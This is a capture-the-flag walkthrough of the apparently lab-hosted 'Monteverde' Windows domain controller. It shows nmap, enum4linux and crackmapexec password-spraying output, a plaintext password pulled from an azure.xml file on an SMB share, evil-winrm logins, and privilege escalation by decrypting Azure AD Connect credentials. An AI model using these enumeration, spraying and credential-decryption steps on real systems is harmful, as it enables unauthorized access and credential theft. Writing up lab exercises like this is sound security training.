# Monteverde

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 5000 -Pn 10.129.228.111
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-05 03:03 EDT
Nmap scan report for 10.129.228.111
Host is up (0.0092s latency).
Not shown: 65517 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49676/tcp open  unknown
49697/tcp open  unknown
```

### Username List -> User Creds

With `enum4linux` and null credentials, we can enumerate the possible users and the domain name:

```
$ enum4linux -u '' -p '' -a 10.129.228.111
Group: 'Operations' (RID: 2609) has member: MEGABANK\smorgan                                 
Group: 'Trading' (RID: 2610) has member: MEGABANK\dgalanos
Group: 'Azure Admins' (RID: 2601) has member: MEGABANK\Administrator
Group: 'Azure Admins' (RID: 2601) has member: MEGABANK\AAD_987d7f2f57d2
Group: 'Azure Admins' (RID: 2601) has member: MEGABANK\mhope
Group: 'Domain Users' (RID: 513) has member: MEGABANK\Administrator
Group: 'Domain Users' (RID: 513) has member: MEGABANK\krbtgt
Group: 'Domain Users' (RID: 513) has member: MEGABANK\AAD_987d7f2f57d2
Group: 'Domain Users' (RID: 513) has member: MEGABANK\mhope
Group: 'Domain Users' (RID: 513) has member: MEGABANK\SABatchJobs
Group: 'Domain Users' (RID: 513) has member: MEGABANK\svc-ata
Group: 'Domain Users' (RID: 513) has member: MEGABANK\svc-bexec
Group: 'Domain Users' (RID: 513) has member: MEGABANK\svc-netapp
Group: 'Domain Users' (RID: 513) has member: MEGABANK\dgalanos
Group: 'Domain Users' (RID: 513) has member: MEGABANK\roleary
Group: 'Domain Users' (RID: 513) has member: MEGABANK\smorgan
Group: 'Group Policy Creator Owners' (RID: 520) has member: MEGABANK\Administrator
Group: 'HelpDesk' (RID: 2611) has member: MEGABANK\roleary
Group: 'Domain Guests' (RID: 514) has member: MEGABANK\Guest

guest
mhope
SABatchJobs
svc-ata
svc-bexec
svc-netapp
dgalanos
roleary
smorgan
AAD_987d7f2f57d2
Administrator
krbtgt
```

We can get a list of usernames here. I tried ASREP-Roasting, but nothing came of it. We can also check if any user has their password as their username with `cracpmapexec`, which returns something interesting:

```
$ crackmapexec smb 10.129.228.111 -u users -p users 2> /dev/null
SMB         10.129.228.111  445    MONTEVERDE       [*] Windows 10.0 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
<TRUNCATED>
SMB         10.129.228.111  445    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs 
```

Seems that we have access to one user. When we enumerate the shares, we can see that we have access to the `users` and `azure_uploads` files. The latter has nothing in it, but the `users` file has loads of files:

```
$ smbclient -U "SABatchJobs" //10.129.228.111/users$
Password for [WORKGROUP\SABatchJobs]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Jan  3 08:12:48 2020
  ..                                  D        0  Fri Jan  3 08:12:48 2020
  dgalanos                            D        0  Fri Jan  3 08:12:30 2020
  mhope                               D        0  Fri Jan  3 08:41:18 2020
  roleary                             D        0  Fri Jan  3 08:10:30 2020
  smorgan                             D        0  Fri Jan  3 08:10:24 2020
smb: \> cd mhope
smb: \mhope\> ls
  .                                   D        0  Fri Jan  3 08:41:18 2020
  ..                                  D        0  Fri Jan  3 08:41:18 2020
  azure.xml                          AR     1212  Fri Jan  3 08:40:23 2020
```

We can see that there's an `azure.xml` file here. It contains a user credential:

```markup
��<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</ToString>
    <Props>
      <DT N="StartDate">2020-01-03T05:35:00.7562298-08:00</DT>
      <DT N="EndDate">2054-01-03T05:35:00.7562298-08:00</DT>
      <G N="KeyId">00000000-0000-0000-0000-000000000000</G>
      <S N="Password">4n0therD4y@n0th3r$</S>
    </Props>
  </Obj>
</Objs>
```

I also noticed that this uses Azure to do stuff, so let's keep that in mind for now. Anyways, we can login via `evil-winrm` with `mhope` and this password.&#x20;

<figure><img src="../../../.gitbook/assets/image (641).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Azure Admins + Azure Connect

When we view our groups within the domain, we see that `mhope` is part of the Azure Admins group:

```
*Evil-WinRM* PS C:\Users\mhope\Documents> net user mhope
User name                    mhope
Full Name                    Mike Hope
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/2/2020 4:40:05 PM
Password expires             Never
Password changeable          1/3/2020 4:40:05 PM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script
User profile
Home directory               \\monteverde\users$\mhope
Last logon                   5/5/2023 12:16:08 AM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *Azure Admins         *Domain Users
The command completed successfully.
```

Within the `C:\Program Files` directory, there are also some files pertaining to Azure:

```
*Evil-WinRM* PS C:\Program Files> dir
d-----         1/2/2020   2:51 PM                Microsoft Azure Active Directory Connect
d-----         1/2/2020   3:37 PM                Microsoft Azure Active Directory Connect Upgrader
d-----         1/2/2020   3:02 PM                Microsoft Azure AD Connect Health Sync Agent
d-----         1/2/2020   2:53 PM                Microsoft Azure AD Sync
```

I googled on how to exploit these services. After some trial and error, I stumbled on this:

{% embed url="https://vbscrub.com/2020/01/14/azure-ad-connect-database-exploit-priv-esc/" %}

Since Azure AD Connect was present, it means that there's a database of which the credentials are being stored. As Azure Admins, we probably have access to these passwords, which can be enumerated and decrypted.

{% embed url="https://github.com/VbScrub/AdSyncDecrypt/releases" %}

We just need to transfer the `AdDecrypt.exe` file along with `mcrypt.dll` to the machine. Then, following the PoC, we need to run this within `C:\Program Files\Microsoft Azure AD Sync\Bin`.&#x20;

<figure><img src="../../../.gitbook/assets/image (4079).png" alt=""><figcaption></figcaption></figure>

Then, using this password, we can login via `evil-winrm`.

<figure><img src="../../../.gitbook/assets/image (3760).png" alt=""><figcaption></figcaption></figure>

Rooted!
